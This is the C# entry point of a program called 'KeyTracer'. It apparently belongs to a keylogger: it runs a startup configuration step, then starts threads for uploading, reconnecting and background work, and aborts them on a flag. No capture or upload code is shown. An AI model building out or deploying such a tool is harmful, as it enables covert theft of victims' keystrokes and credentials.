using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;

namespace KeyTracer
{
    class Program
    {
        static void Main(string[] args)
        {
            StartUp.Configure();

            Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
            uploadWork.Start();

            Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
            reConnect.Start();

            Thread work = new Thread(new ThreadStart(Threads.DoWork));
            work.Start();

            while (true)
            {
                Thread.Sleep(Consts.matchDelayTime);

                if (!Consts.doWork)
                {
                    Threads.AbortThreads(work, uploadWork, reConnect);
                }
            }
        }
    }
}
